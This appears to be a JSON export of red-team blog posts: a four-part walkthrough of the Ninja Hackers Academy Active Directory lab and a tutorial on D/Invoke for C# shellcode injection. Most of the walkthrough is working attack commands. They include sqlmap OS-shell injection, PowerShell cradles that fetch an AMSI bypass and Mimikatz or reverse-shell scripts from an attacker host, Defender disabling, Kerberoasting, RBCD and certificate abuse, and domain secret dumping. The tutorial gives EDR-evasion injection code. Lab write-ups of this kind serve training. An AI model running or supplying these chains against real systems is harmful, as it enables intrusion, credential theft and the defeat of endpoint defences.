[ { "title": "AD Pwnage: Ninja Hackers Academy Part 4", "url": "/posts/NHA-Part-4/", "categories": "", "tags": "Red Team", "date": "2024-03-30 00:00:00 +0500", "snippet": "IntroductionAt this point, we have the domain. But we need to find any trust relationships that this domain has and if any, we need to move to that domain.Enumerating TrustsWe can check the trust relationships of the domain by using ldeep.ldeep ldap -u Administrator -H 8fd12ffe951b45af5bea2bd921accba4:8fd12ffe951b45af5bea2bd921accba4 -d 192.168.58.20 -s ldap://192.18.58.20 trustsWe have a Bi-Directional, FOREST_TRANSITIVE trust relationship with the domain ninja.hack. To learn more about trust and relations this and this are the two personally recommended posts.So because this is a bi-directional trust, we are able to enumerate the objects in the other domain. We can get a havoc demon on the DC of academy domain and use SharpHound.exe.dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/SharpHound.exe -c all -d ninja.hack --ldapusername backup --ldappassword 'Password123!'If for some reason this is not working, you can use the same command in the WinRM session after turning Defender off. One other way to do it is to turn RDP on over the DC and then use command prompt to run SharpHound.exe. We can then enumerate the ninja.hack domain using the bidirectional trust that we saw earlier.After looking a little, I can see that user olivia and a user frank exist in both the domains.ACLs to Rachel.PhilipsWe already have dumped hashes. We can try those hashes against these users to see if they work (Some of you might have made good notes unlike me to see that this also hints in the contact page of the original web page.).So we have a user in the ninja domain. perfect. If we look in bloodhound to her first degree object control, we can see that this user has WriteDACL permission over the user rachel.philips. We can use this to get to that user.dacledit.py -action 'read' -principal olivia.davis -target 'rachel.philips' 'ninja.hack'/'olivia.davis' -hashes aad3b435b51404eeaad3b435b51404ee:91d85135bb2c4e12c46efbb77612c487dacledit.py -action 'write' -rights 'FullControl' -target 'rachel.philips' 'ninja.hack'/'olivia.davis' -hashes aad3b435b51404eeaad3b435b51404ee:91d85135bb2c4e12c46efbb77612c487We were able to successfully change the access to FullControl to the user rachel.philips. Now we can change this user’s password to access it. We cant use shadow credentials to get the hash for this user as done here because we get KDC_ERR_PADATA_TYPE_NOSUPP error meaning ther DC is not set for PKINIT authentication. We can use bloodyAD for it as seen here.bloodyAD --host 192.168.58.10 -d ninja.hack -u olivia.davis -p :91d85135bb2c4e12c46efbb77612c487 set password rachel.philips 'Password123!'Path to JONIN GroupLooking back to BloodHound, I can see Group Delegated Object Control that I can use this user to the jonin group.bloodyAD --host 192.168.58.10 -d ninja.hack -u rachel.philips -p 'Password123!' add groupMember jonin rachel.philipsWe can confirm this using this.ldeep ldap -u rachel.philips -p 'Password123!' -d ninja.hack -s ldap://192.168.58.10 membersof 'JONIN'Certificate AbuseAfter poking around a lot and not finding anything, I started looking into the ADCS misconfigurations.We can use this to query and find the vulnerable template details.certipy find -u 'rachel.philips@ninja.hack' -p 'Password123!' -dc-ip 192.168.58.10 -vulnerable -stdoutWe can see that it specifies that JONIN has dangerous rights and its vulnerable to ECS4.As said by lummelsec on this post, we can use this command to make this certificate vulnerable to ECS1.certipy template -u 'rachel.philips@ninja.hack' -p 'Password123!' -target 'ninja.hack' -template 'SignatureValidation'We can use this to get a certificate file.certipy req -u 'rachel.philips@ninja.hack' -p 'Password123!' -target 'dc-vil.ninja.hack' -ca 'NINJA-CA' -template 'SignatureValidation' -upn 'Administrator@ninja.hack'Next we can use these command to grant DCSync privileges to rachel.philips and dump secrets of the ninja.hack domain.certipy cert -pfx \"administrator.pfx\" -nokey -out \"user.crt\"certipy cert -pfx \"administrator.pfx\" -nocert -out \"user.key\"passthecert.py -action modify_user -crt \"user.crt\" -key \"user.key\" -domain \"ninja.hack\" -dc-ip 192.168.58.10 -target \"rachel.philips\" -elevatesecretsdump.py -just-dc ninja.hack/rachel.philips:'Password123!'@ninja.hackAnd we can get the last flag as well (yes theres flags in this. i forgot to mention that in the previous posts. maybe the reader can try getting them all ;). )Aaaand thats it!! We have successfully gone through the whole NHA labs. Special thanks to the amazing creator MayFly who created them. As of writing this, he also introduced some new SCCM labs which I may or maynot be looking into next. This lab and SCCM and GOAD can be found here. Do give it a try to make AD methodology better. There will be a last post about blue team side of things. As always let me know if help is needed at any point. You know where to find me." }, { "title": "AD Pwnage: Ninja Hackers Academy Part 3", "url": "/posts/NHA-Part-3/", "categories": "", "tags": "Red Team", "date": "2024-02-05 00:00:00 +0500", "snippet": "IntroductionIn the previous one, we pivoted from one machine to another using the GenericAll privileges over a container and then using RBCD to successfully generate a ticket that gave us the keys as Administrator to the WEB$ machine. In this one we are going to see how we can go from there to other machines. The goal here is to reach domain admin in this domain and then do some trust hax and jump to any other forest that there might be (there is. this should have been covered by the reader in the previous posts when we got iniital access to the domain.)Harvesting CredsBefore going nay further, we will make sure not to lose access. For that I’ll run the same modified Invoke-Mimikatz.ps1 script. I have added the following lines in the end of the script.Invoke-Mimikatz -DumpCredsInvoke-Mimikatz -Command \"token::elevate lsadump::sam exit\"Invoke-Mimikatz -Command \"token::elevate sekurlsa::ekeys exit\"So using the same command we can dump some hashes.powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safedogz.ps1') -UseBasicParsing | iex\"Notably, we get the follwoing hashes that we need to save.Administrator:0c532fcf2046010cb8d38eedf5e45312frank:d4fad93561dee253398d5891e991a6fbWEB$:1cee40630bb1fe3f4ae2adfc6e7ec977With this, we seem to have a user account. One we didn’t have previously. We can try to see what this account can access using this command.netexec smb 192.168.58.0/24 -u frank -H d4fad93561dee253398d5891e991a6fbWe can use evil-winrm to login to any of these machines and confirm our access.evil-winrm -i 192.168.58.21 -u frank -H d4fad93561dee253398d5891e991a6fbBloodHound to the rescue (again…)After this, we can try to find something interesting in the machines itself, locating passwords from browsers etc. and such. I have tried it. Couldn’t find anything worth while. We can move over to BloodHound again. We can start by marking assets that we have access to now as owned. Then map a path from the owned principles to other assets in the domain. While doing it for SHARE$ machine, I can see that user frank has a right to delegate to that machine.We can confirm this by using this command.findDelegation.py academy.ninja.lan/frank -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb -dc-ip 192.168.58.20This shows us that user frank has Constrained Delegation with Protocol Transition rights for the eventlog service. This can be read about here.As seen here, frank has the rights to the service eventlog. This can be misused by creating a service ticket by using the user frank which will impersonate Administrator to the service eventlog. But we will also provide a diferent service using the altservice flag of CIFS which will help us access the file system or use tools like PSExec or SMBExec. This happens because the service name part of the ticket is not protected so we can change it whatever we like.One thing to note, the original Impacket’s getST.py will not have the option for altservice. You can use this to get the one with this flag./opt/impacket-getst/examples/getST.py -spn 'eventlog/share' -altservice 'cifs/share' -impersonate Administrator -dc-ip 'academy.ninja.lan' \"academy.ninja.lan\"/\"frank\" -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fbAfter this we can export it and see if it works using SMBExec.pyexport KRB5CCNAME=Administrator@cifs_share@ACADEMY.NINJA.LAN.ccachesmbexec.py @share -k -no-pass -dc-ip 192.168.58.20 -target-ip 192.168.58.23On thing to mention, the usual Impacket was immediately getting detected. But for some reason Impacket for Exegol was not. That worked fine. You can find that here.After moving it to our C2, we can look around for some thing interesting. I found a bot.ps1 script that contains the password of frank user.We can try to spray this password over all the users in the domain to find if we can find another user with this same password.netexec smb 192.168.58.20 -u creds/academy_users.txt -p 'Il0ve!R4men_&lt;3' --continue-on-successGMSA DumpingThat doesn’t give us much. We can move back to BloodHound to check what we can find. By looking around, we can find that the machine we just got into has the ability to read GMSA password of the gmsaNFS$ machine. This is, as the name suggests, a NFS or a file share account which is a machine account.For this, we would need the machine account hash for SHARE$. After aquiring the hash we can use gMSADumper.py to confirm that SHARE$ can read the password. For some reason it was not dumping the password itself.python /opt/gMSADumper/gMSADumper.py -u SHARE$ -p 791782105dd864621fbbf9e0fbed9fc7:791782105dd864621fbbf9e0fbed9fc7 -d academy.ninja.lan -l dc-ac.academy.ninja.lanAt this point, the default havoc payload was not working. This is my new best friend (lowkey waiting for a discount or a giveaway…). If after access its giving you troubles, you can always remove the defender definitions to make eveything else be nice.We can use this to dump the passwords instead using havoc.dotnet inline-execute /opt/Toolies/GMSAPasswordReader.exe --AccountName gmsaNFS$And we get the hashes.ACL PwningHaving a look in BloodHound we can see that the machine gmsaNFS$ has an ACL ForceChangePassword over the backup user. We can use PowerView to do this.IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -ForceSet-DomainUserPassword -Identity 'backup' -AccountPassword $NewPasswordAfter this, we canfirm it using netexecnetexec smb 192.168.58.20 -u backup -p 'Password123!'Over to the Domain AdminBack to good ol’ bloodhound. We can see that this user basicallty carries the keys to the domain.We can again confirm that using owneredit.py from the ShutDownRepo fork of impacket./opt/impacket-getst/examples/owneredit.py -action read -target 'Domain Admins' academy.ninja.lan/backup:'Password123!'We can use this to change the owner of the Domain Admins group to backup as well./opt/impacket-getst/examples/owneredit.py -action write -new-owner 'backup' -target 'Domain Admins' academy.ninja.lan/backup:'Password123!'Once that is done we can easily update the user backup to have GenericAll privileges over the Domain Admins group using dacledit.py.dacledit.py -action 'write' -rights 'FullControl' -principal backup -target 'Domain Admins' 'academy.ninja.lan'/'backup':'Password123!' This can again be confirmed using BloodHound dump.bloodhound-python -c all -d academy.ninja.lan -v -u backup -p 'Password123!' -ns 192.168.58.20 --zipOnce that is confirmed, the only thing remaining is really just adding ourselves in the Domain Admins group.net rpc group addmem 'Domain Admins' backup -U academy.ninja.lan/backup -S 192.168.58.20Confirming it works.With all this out of the way, we can finally dump the domain secrets using secretsdump.py and pwn the whole domain.impacket-secretsdump 'academy.ninja.lan'/'backup':'Password123!'@192.168.58.20 -dc-ip 192.168.58.20 -outputfile domainFinally, we can log in to the domain controller to confirm.This marks the end of the third post with us being the domain administrator in the domain. But the work is not finished. In the next one we will move from this domain to the other domain in the trust relationship. Let me know if I missed or messed up a step. Be happy to help!" }, { "title": "AD Pwnage: Ninja Hackers Academy Part 2", "url": "/posts/NHA-Part-2/", "categories": "", "tags": "Red Team", "date": "2024-01-21 00:00:00 +0500", "snippet": "IntroductionIn the previous one, we went from a scope of subnet to initial access using an SQL injection and also escalated our privileges to SYSTEM to get more access. This time, we are going to see what we can do to jump from this mahcine to the next one.Making Sure Our Wins aren’t Short LivedSo from the SYSTEM shell access, we can go ahead and get a lay of the land. We know our IP and the machine is SQL$. To make sure we dont lose access we can dump hashes. ANother thing would be to add persistence in the machine as good measure. THis would be done in an actual red team engagement. In this case, I’m skipping that out.The best thing would be to use something custom or modified version of mimikatz to fly undetected. BUT! we are just going to use a safedogz.ps1 which contains an AMSI bypass and calls dogz.ps1 which is a little modified version of nishang’s Invoke-Mimikatz.ps1 (you can probably guess what the modification is) and it has the call Invoke-Mimikatz -DumpCreds at the end. This works, but it also gives out an alert by Defender that something fishy is happening. For some reason it does give the result back and also doesnt kill out session on Havoc so eh it works.We are going to use the same command again but in Havoc.powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safedogz.ps1') -UseBasicParsing | iex\"For those who are wondering we get this nasty behavioural alert on defender.But at the same time we also get these nice sweet sweet hashes back.Keeping these saved, we can move further. In case your defender is faster and blocking it, you cold use a second C2 at this point. One option is Sliver. It has a built in function to dump hashes using nanodump which worked when I tried it. A second C2 is also a good idea to keep as a backup in case you lose you initial shells. You can use the other one as a backup to bring up instead of running the whole process again. Especially if the initial one was obtained using some phishing tactic.Another option, which is not so red teamy, is to turn defender off using this powershell command.Set-MpPreference -DisableRealTimeMonitoring $trueOr a little bit more OPSEC safe way is to remove all definitions using this.&amp; 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -AllJust to keep in mind its a huge red flag in mature environments. In the continuation of this lab, I’m going ot be removing the definitions. This is just to make our work easier. Basic bypasses can still be used as previously done, to get past defender. However, in some cases things might get a little itchy. So, just to ease it and not having to make custom modifications to tools, I’ll do this. I’ll mention when I’m actually doing it so you wont get confused how my commands worked but you’re commands are geting killed by the big baddie defender.Getting a Lay of the Land in the DomainSo to continue gettting an understanding of the schema of this organization, we will be using BloodHound. This will help us visualize what we are working with.We can use SharpHound.exe to get the data to feed BloodHound. SharpCollection will be used again (Thanks flangvik!!).dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/SharpHound.exe -c allWe will get the data. Then we can download it simply by using download command in Havoc.Next we can locate it in this directory for me./opt/Havoc/data/loot/2024.01.13._00:43:07/agents/15b67a26/Download/C:/tmp/20240113031943_BloodHound.zipNow we can put it in BloodHound to see what we have. First we can see the computers in the domain.We can also see the users. One thing we can do is get all the usernames and try and ASREP Roasting attack. We are going to unzip the bloodhound data and find a JSON file of users. Then we can use JQ and this command to just get the SAMAccountName of the users. I learned this trick from Ippsec’s video.cat 20240113031943_users.json | jq -r '.data[].Properties.samaccountname'This gives us all of the usernames.We can save these in a users text file. Then we can use this commmand to go through all of these users and use the Impacket script GETNPUsers.py to find if any users have pre-auth disabled.for user in $( cat academy_users.txt ); do GetNPUsers.py -no-pass -dc-ip 192.168.58.20 ACADEMY/${user} -format hashcat | grep -v Impacket; doneWe get these results.Unfortunately, no easy win for us. This didnt work. We can also use this command to find user’s descriptions in case we have some passwords in descriptions (yes. it does happen.).cat 20240113031943_users.json | jq '.data[].Properties.description'Also while we are on the topic of kerberos, with ASREP Roasting, we can see which users might be kerberoastable. This can be checked from BloodHound.We have user Frank, sql_svc which is a service account most probably, and the default krbtgt account. We can get the hashes using this command in our C2.dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/Rubeus.exe kerberoast /nowrapAfter getting the hases we can try and crack them using hashcat.hashcat -m 13100 -a 0 kerberoast.hashes ~/Desktop/rockyou.txt --forceUnfortunately again, it doesnt take us anywhere. We can take a look at the prebuilt queries in BloodHound to learn more about the internal environment. One more thing that we should do is to mark SQL$ machine as owned so we can keep a track of our actions.We can look around in the SQL$ machine and get a password from a config file at C:\\setupSAPWD=\"sa_P@ssw0rd!N1nJ4hackaDemy\"This is is the SQL Admin password or sa user’s password. We can look around in the database using this command to see if there are any other credentials in there.impacket-mssqlclient sa:'sa_P@ssw0rd!N1nJ4hackaDemy'@192.168.58.22I couldn’t find anything of interest there. Back to BloodHound. We can use a really cool feature of it which is mapping to and from to see if there is a way we can pivot from one machine to another.We can see something cool if we map the way from our owned SQL$ machine to WEB$ machine. It shows that SQL$ has GenericAll privileges over the COMPUTERS container, of which the WEB$ machine is a part of.Packing Up, Ready to Jump to New Horizons (Pivoting)This is a bit tricky. See, if we had these privileges over directly the other machine, it would have been easy. After stumbling around it a lot and wondering why it wasn’t working I was pointed to the reason. After all, if WEB$ is a part of the container we have GenericAll privileges over, shouldn’t we have enough privileges to work with? The answer is no.You see, we don’t exactly have the privileges. Not over the object that is a part of it. The author made a tweet about it a while ago as well. To be able to actually do it, we would need to enable inheritance. This would pass any privilege over the container to the objects inside the container as well.For this we will be using the dacledit.py script to edit the Discretionary Access Control List (DACL). This is not a part of the official Impacket repo (as far as I know). We can find it here at the branch dacledit. We can use it to add inheritance to the container. You can read more about it from here.We can use this command that will do it.dacledit.py -action \"write\" -principal SQL$ -target-dn \"CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN\" \"academy.ninja.lan\"/\"SQL$\" -hashes 7bd73a3ebe97a16f0691a0f51292dd47:7bd73a3ebe97a16f0691a0f51292dd47 -inheritanceThis enabled inheritance using our SQL$ machine hashes to the Distinguished Name (dn) of COMPUTERS. Once that is done, we can see that we now have GenericAll privileges over the WEB$ machine.And now we can go down the Resource Based Constrained Delegation (RCBD) route. To explain this in simpler terms, we are going to create a machine account that we control and have the password of. We are going to add msDS-AllowedToActOnBehalfOfOtherIdentity to the WEB$ machine from our newly created machine account. Then we can abuse that and get a service ticket to the WEB$ machine as Administrator.First we need to create a machine account. We are allowed to do so because in AD by default any user is allowed to create 10 machine accounts (machine account quota). We can use addcomputer.py script from Impacket to do so.addcomputer.py -computer-name 'crypt0ace$' -computer-pass 'Password123!' -dc-host academy.ninja.lan \"academy.ninja.lan\"/\"SQL$\" -hashes 7bd73a3ebe97a16f0691a0f51292dd47:7bd73a3ebe97a16f0691a0f51292dd47Now that it is created we can make it delegate to the WEB$ machinerbcd.py -delegate-from 'crypt0ace$' -delegate-to 'web$' -dc-ip 'academy.ninja.lan' -action 'write' \"academy.ninja.lan\"/\"SQL$\" -hashes 7bd73a3ebe97a16f0691a0f51292dd47:7bd73a3ebe97a16f0691a0f51292dd47We can confirm that it worked by reading the delegate list using this commandrbcd.py -delegate-to 'web$' -dc-ip 'academy.ninja.lan' -action 'read' \"academy.ninja.lan\"/\"SQL$\" -hashes 7bd73a3ebe97a16f0691a0f51292dd47:7bd73a3ebe97a16f0691a0f51292dd47Perfect! It worked. Now we can request a service ticket using getST.py for the service CIFS so we can use things like psexec.py and smbexec.py and we are going to impersonate the Administrator user.getST.py -spn 'cifs/web.academy.ninja.lan' -impersonate Administrator -dc-ip 'academy.ninja.lan' \"academy.ninja.lan\"/\"crypt0ace$\" -hashes 2b576acbe6bcfda7294d6bd18041b8fe:2b576acbe6bcfda7294d6bd18041b8feNow we can export the ticket and use smbexec.py which is much better to move around Defender and get a shell on the WEB$ machine.Next we can move this as well to our C2 using these commands.powershell.exe -c \"iwr http://192.168.58.50/demon.exe -o C:\\tmp\\demon.exe\"C:\\tmp\\demon.exeAnd as expected, we get it.With this much done, I’m gonna head out. As always, If theres any thing you need to discuss I’m on Twitter and LinkedIn." }, { "title": "AD Pwnage: Ninja Hackers Academy Part 1", "url": "/posts/NHA-Part-1/", "categories": "", "tags": "Red Team", "date": "2024-01-13 00:00:00 +0500", "snippet": "IntroductionIn these series of posts we are going to look into an AD lab called Ninja Hackers Academy (NHA) which can be found here. This is part of some great Active Directory labs from OrangeCyberDefense on Github. I highly recommend checking out GOAD to learn many many cool ways of Active Directory Hacking as a beginner. You can also follow the writeups of GOAD from here by the author mayfly277.Lets get into it. NHA is built as a challenge lab and no writeups are provided. So this is going to be writeup for these. Bear in mind these are somewhat hardened machines and Defender is enabled on all the machines.Initial Recon and AccessSo we are starting with the scope of subnet of 192.168.58.0/24. We can start the initial scan using nmap to see what ports are open on what machines.nmap -p- -sC -sV 192.168.58.0/24 -Pn -oA allports.nmapWe have a list of IPs that are up. 192.168.58.10 192.168.58.20 192.168.58.21 192.168.58.22 192.168.58.23We can see from the port scan that most of these are usual AD ports.We can check out the web server on port 80.So the first one is a DC by a look at the port 88 which is kerberos being open. We can see that the machine 192.168.58.21 has a port open as well. It is also stated as the starting point in the README.md file so we will have a look at that. Before doing so I can also scan the subnet using netexec (which is the same as CrackMapExec and can be found here) to get basic information on the domain.netexec smb 192.168.58.0/24So we can see that we have the same IPs up. The 192.168.58.20 is the domain controller for ACADEMY.NINJA.LAN and 192.168.58.10 is the DC for the domain NINJA.HACK guessing from the SMB signing being enabled. In case of a wider scope I’d have to manually find that out or confirm from the nmap scan. From the initial point I can guess that we would be initially working our way in the ACADEMY.NINJA.LAN domain. I can add these to my /etc/hosts files as well so I can have some DNS resolution.Going the web server we are greeted with a academy page.Looking around I can see that there is a weird URL that almost seems like a direct SQL query. We can also see the usernames. We can try to make a list by following the context as in the about us page which is firstname.lastname. But we can do this later as well.We can try the UNION Based SQL Injection here. First we have to figure out the number of columns.http://web.academy.ninja.lan/Students?SearchString=&amp;orderBy=5--This gives out an error while 4 doesnt. Now we can go the route to manually extract data. Or we could just throw SQLMap to it and it will also help us to get a shell. Using this command.sqlmap -u 'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname' --current-db --batch --threads 10This returns the current database as academy. We can try to see if we have the privileges and if we can run xp_cmdshell to run system commands on the machine.sqlmap -u 'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname' --os-shell --batch --threads 10We can also check to see whats happening behind hte scenes. For that, we can run the same command but this time after providing it the proxy of burpsuite so we can intercept the request that it makes to run OS commands.sqlmap -u 'http://192.168.100.58/Students?SearchString=&amp;orderBy=Firstname' --os-shell --batch --threads 10 --proxy=127.0.0.1:8080From this shell we can run commands and get their output. Here I am straight up going to try and get a reverse shell up. I am using 2 powershell scripts. In this order: safe.ps1 - Has an AMSI Bypass and calls call.ps1 call.ps1 - Has a modified version of nishang shell Invoke-PowerShellTcpOneLine.ps1After setting up a simple python serverpython -m http.server 80Then we can use this command to run the powershell script. This also bypasses the new cmdline detection byt defender.powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safe.ps1') -UseBasicParsing | iex\"We can see the SQLMap making a database connection and trying to execute xp_cmdshell module.If we decode it from URL using CyberChef we get this.It declaring a variable with a character set of 8000 characters enough to fit in our payload. Then it is adding some hex value in it and using xp_cmdshell to execute that. If we convert this value from hex, we get our payload.And after running this we get a shell back at out netcat prompt from the IP 192.168.58.22. Its a bit broken and sad but we can fix it.Right. So make it better and have some sort of ease into managing the different shells that we are going to get, we are going to use a Command and Control, otherwise known as a C2. There are many popular ones, including both free and paid. For this lab we are going with Havoc built by C5pider. Its a really good C2 that is open source (so free) which would be way more than enough for this lab. One thing to note, sometimes the default payload built by Havoc might not work. It might get detected because its open source and signatures get built fast to detect these. You might have some luck if you use a mixture of parameters that you can change in Havoc payload generator and spice up your profile to use with the C2 and get better results. You could also build a custom loader for this. THere are many many great resources and research available for the one looking in the right direction. With a little knowledge, bypassing Defender shouldn’t be any issue. Look around for it.We are going to try and upload our binary to the web server using this netcat session and execute it. Putting artifacts on disk is never a good option, red teaming wise. But in this case I’m just gonna let that slide…iwr http://192.168.58.50/demon.exe -o C:\\tmp\\demon.exeAnd then just execute it.C:\\tmp\\demon.exeAfter a couple of seconds we get the first callback. We can run the following command and get information about our current session. (Running whoami.exe? bad opsec bro).shell whoami /allThis is what we getWe can see that we dont exactly have a SYSTEM level shell but instead a network service user. This happens when we get a shell from other sources. So an IIS shell would most probably be something like iisapppol. These usually have the SeImpersonatePrivilege enabled by default because they have to impersonate the user in context of who is running it. This is what we can abuse to impersonate an SYSTEM user and get a shell with that.Escalating our way to SYSTEMWe can use SweetPotato.exe to get a shell as SYSTEM in this case. This is being used from the awesome repository by Melvin Langvik’s github called SharpCollection.dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\tmp\\demon.exe\"Just like that, we get a second callback with our SYSTEM shell.Right so, we got one machine. I’m gonna sign off on this. In the next part, we are going to see some pivoting. If theres any questions of any sort, or wanna talk about something I can be found on Twitter and LinkedIn." }, { "title": "Using D/Invoke for Offensive Tool Development in C#", "url": "/posts/Using-DInvoke-For-Offensive-Tool-Development/", "categories": "", "tags": "Red Team", "date": "2022-10-01 00:00:00 +0500", "snippet": "Introduction:In this post we are going to have a look into the D/Invoke project by TheWover. He also wrote a really good blog post which you can read here where he demonstrates in detail how the whole project works. It covers some really cool aspects so its highly recommended to check it out. This post mainly focuses on creating a shellcode injection tool using all the methods that he specifies in his blog.Sharpsploit also has integrated D/Invoke in their project which can be read about here.What is D/InvokeI have talked about what P/Invoke or Platform Invoke is in the previous posts (here if youre interested). Its a great way to use WinAPI and unmanaged code into our managed C# code. But it has some issues for us as offensive tool developers. Its not really OPSEC safe. A lot of AVs/EDRs catch these tools easily. In the last post, I talked about how EDRs usually work by hooking into processes and how we can try and evade their detections by unhooking DLLs. A good method but still not OPSEC safe. What if the defenders look at those specific imports that are made to unhook the DLLs? What is they are looking at the suspicious imports? Thats where D/Invoke comes in.Using D/Invoke we can dynamically invoke (hence the name D/Invoke) during runtime from the DLL loaded in memory which can help us bypass API hooks and also the Import Address Table would not show any suspicious imports.The inner workings of some methods used in D/Invoke are similar to what I already have posted about. The classic method uses delegates almost similar to what I discussed here, the mapping method is similar to what was discussed here. But it takes a whole lot of work and makes things very simple and easy and some other cool features as well.Using D/InvokeThere’s 4 different ways we can use D/Invoke. Dynamic API Method (Classic Method) Manual Mapping Method Overload Mapping Method Syscalls MethodDynamic API or Classic MethodThe simplest and easiest way to get started with D/Invoke is using teh dynamic API method. It is called using DynamicAPIInvoke and it uses GetLibraryAddress to locate the function specified from the module in memory or from disk. I have cloned the D/Invoke repo from github and added the D/Invoke folder in my solution on Visual Studio. Should be noted that this project is also available in nuget so you can get the DLL directly and use that too. For our demo, we are using these API calls OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThreadI’m using the same example from here and porting it from P/Invoke to D/invoke so its going to follow the same logic.For using OpenProces, we would need to use GetLibraryAddress with 2 parameters. the DLL or module name, and the function call we need. Then we need a delegate with the parameters that the function needs because we are going to get a function pointer for that delegate which we can pass the arguments we need. Remember to add the namespace with using DInvoke; and keep an eye from where the methods are being called like DInvoke.DynamicInvoke.Generic.GetLibraryAddress().// The Delegate[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate IntPtr OpenProcessD(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);// The Function Callptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress(\"kernel32.dll\", \"OpenProcess\");OpenProcessD OpenProcess = (OpenProcessD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(OpenProcessD));IntPtr procHandle = OpenProcess((uint)desiredAccess, false, (uint)processId);Its this simple to get a dynamic API call working. Another way is to use this is to first create a object array to store our parameters. Then use DynamicAPIInvoke with 4 parameters. The DLL or module name, function call, the delegate and then a reference to the object array of arguments that were specified.// Also needs the delegateobject[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(\"kernel32.dll\", \"OpenProcess\", typeof(OpenProcessD), ref OpenProcessArgs);Both of these are similar with how they work. Using the same method we can port all the other API calls to D/Invoke. The full source code is mentioned at the end.Manual MappingIf you read the last post about unhooking DLLs in which we mapped a fresh copy of NTDLL in memory by getting a handle to the DLL on disk mapping it in memory using all sorts of APIs then manually rewritting the .text section with our new fresh DLL. Using D/Invoke, all this can be summarized in just 2 lines of code.PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@\"C:\\Windows\\System32\\kernel32.dll\");Best case is to use ntdll.dll because if kernel32.dll calls APIs from NTDLL.dll that are hooked by AV/EDR it will get caught but in this case Im going to be using kernel32.dll to make it simpler. The rest of the code is similar. We need to specify a delegate for our function just like before, and object array of arguments we need and then we use CallMappedDLLModuleExport with 6 arguments. The PEINFO struct of our newly mapped DLL, the module base address of our DLL, the function name we need, the delegate, function arguments and wether or not the DLLMain method is needed to be called. Calling from modules like kernel32.dll or NTDLL.dll etc set this to false.object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, \"OpenProcess\", typeof(OpenProcessD), OpenProcessArgs, false);Using this way we can put together the other APIs as well and get our shellcode executed. No need to map the same module again. Just use the CallMappedDLLModuleExport in case you’re using the same DLL.Overload MappingVery similar to manual mapping method with one key difference. According to the blog by TheWoverModule Overloading allows you to store a payload in memory (in a byte array) into memory backed by a legitimate file on disk. That way, when you execute code from it, the code will appear to execute from a legitimate, validly signed DLL on disk.This method makes it more stealthier. Usuage is the same as manual mapping.PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();mappedDLL = DInvoke.ManualMap.Overload.OverloadModule(@\"C:\\Windows\\System32\\kernel32.dll\");And then we can call the functions using the same way as before.object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, \"OpenProcess\", typeof(OpenProcessD), OpenProcessArgs, false);SyscallsSyscalls can be explained in a whole other blog. Its the hot topic and very much used by advanced malware authors in order to evade AVs/EDRs. The summary is that because AVs/EDRs hook API calls like OpenProcess, offensive developers started to use NtOpenProcess from NTDLL.dll to which OpenProcess gets transfered anyways for transition into kernel land. When AVs/EDRs caught up to this they started to hook into Nt* functions as well. Then came syscalls. Looking up the NTDLL.dll in memory and calculating where the syscall for the function is and using it to get directly to the kernel avoiding the hooks.This small summary doent do justice to the whole theory of syscalls wo its recommended to read up further on this topic. SOme refernces are provided at the end.This technique is a bit trickier and took some time until I figured it out. The issue were 2 things. Identifying what userland calls get forwarded to what kernel mode calls. What arguments are supposed to be provided to the Nt* calls.We can use the GetSyscallStub function from D/Invoke with the function name we want. We dont need to provide any DLL because it will always look up form NTDLL.dll. Then next step is to get a funtion pointer for our delegate. And then we use the NtOpenProcess call. For the arguments that we need to provide i took a look at three resources. PInvoke.net DInvoke.net Undocumented APIsThese calls also use the NTSTATUS struct. So we can initialize the syscall stub and the marshaling using this.IntPtr syscall = IntPtr.Zero;syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub(\"NtOpenProcess\");NtOpenProcess NtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtOpenProcess));Then we can provide the arguments as this.var oa = new Native.OBJECT_ATTRIBUTES();var cid = new Native.CLIENT_ID{ UniqueProcess = (IntPtr)processId};var procHandle = IntPtr.Zero;Native.NTSTATUS status = NtOpenProcess(ref procHandle, desiredAccess, ref oa, ref cid);This way we can do all the APIs as well.CodeThe full source code demonstrating all the methods can be looked at here. Provide the tool with a process ID as argument and you can specify the method by uncomenting the method you want to use.ReferencesCredits to the work these amazing researchers D/Invoke - TheWover Emulating Covert Operations - Dynamic Invocation 